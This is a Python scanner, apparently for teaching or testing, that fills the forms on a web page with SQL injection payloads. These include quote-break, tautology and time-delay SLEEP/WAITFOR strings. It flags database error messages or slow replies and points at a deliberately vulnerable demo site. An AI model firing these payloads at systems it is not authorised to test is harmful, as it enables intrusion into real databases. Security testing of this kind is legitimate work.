import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0"

# Advanced payloads for SQL injection testing
payloads = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "OR 1=1", "' OR '1'='1' --", "\" OR \"1\"=\"1\" --", 
    "' OR '1'='1' #", "\" OR \"1\"=\"1\" #", "' OR 1=1 --", "\" OR 1=1 --", "'; --", "\"; --", 
    "' AND SLEEP(5) --", "\" AND SLEEP(5) --", "'; WAITFOR DELAY '0:0:5' --", 
    "\"; WAITFOR DELAY '0:0:5' --"
]

# Known SQL error patterns for various databases
error_patterns = {
    "MySQL": [
        "you have an error in your SQL syntax", "warning: mysql", "unclosed quotation mark",
        "quoted string not properly terminated", "mysql_fetch", "syntax error"
    ],
    "PostgreSQL": [
        "pg_query", "syntax error at or near", "unclosed quotation mark", "unterminated quoted string"
    ],
    "MSSQL": [
        "unclosed quotation mark after the character string", "microsoft odbc", 
        "incorrect syntax near", "unclosed quotation mark after the character string"
    ],
    "Oracle": [
        "quoted string not properly terminated", "ora-00933", "ora-00907", "ora-01756"
    ]
}

def get_forms(url):
    soup = BeautifulSoup(s.get(url).content, "html.parser")
    return soup.find_all("form")

def form_details(form):
    detailsOfForm = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    detailsOfForm["action"] = action
    detailsOfForm["method"] = method
    detailsOfForm["inputs"] = inputs
    return detailsOfForm

def vulnerable(response):
    for db, errors in error_patterns.items():
        for error in errors:
            if error in response.content.decode().lower():
                return True, db
    return False, None

def blind_sql_injection(form_url, details):
    # Blind SQL injection check using time delay
    delay_payload = "' OR SLEEP(5) --"
    data = {}

    for input_tag in details["inputs"]:
        if input_tag["type"] != "submit":
            data[input_tag["name"]] = delay_payload

    start_time = time.time()
    if details["method"] == "post":
        res = s.post(form_url, data=data)
    else:
        res = s.get(form_url, params=data)
    end_time = time.time()

    return end_time - start_time > 4  # If response delay is over 4 seconds, likely vulnerable

def sql_injection_scan(url):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    vulnerabilities = 0

    for form in forms:
        details = form_details(form)
        form_url = urljoin(url, details["action"])

        for payload in payloads:
            data = {}
            for input_tag in details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    data[input_tag["name"]] = input_tag["value"] + payload
                elif input_tag["type"] != "submit":
                    data[input_tag["name"]] = f"test{payload}"

            if details["method"] == "post":
                res = s.post(form_url, data=data)
            else:
                res = s.get(form_url, params=data)

            is_vulnerable, db_type = vulnerable(res)
            if is_vulnerable:
                print(f"[-] SQL Injection vulnerability detected in form at {form_url}")
                print(f"    Payload: {payload}")
                print(f"    Database Type: {db_type}")
                vulnerabilities += 1
                break  # Stop testing more payloads for this form if vulnerable

        # Check for blind SQL injection vulnerability
        if blind_sql_injection(form_url, details):
            print(f"[-] Blind SQL Injection vulnerability detected in form at {form_url}")
            vulnerabilities += 1

    print("\n[Summary]")
    print(f"Scanned {len(forms)} forms; {vulnerabilities} vulnerable form(s) detected.")
    if vulnerabilities == 0:
        print("The website appears secure against SQL injection.")
    else:
        print("Consider using parameterized queries, input validation, or implementing a WAF.")

if __name__ == "__main__":
    urlToBeChecked = "http://testphp.vulnweb.com/login.php"
    sql_injection_scan(urlToBeChecked)
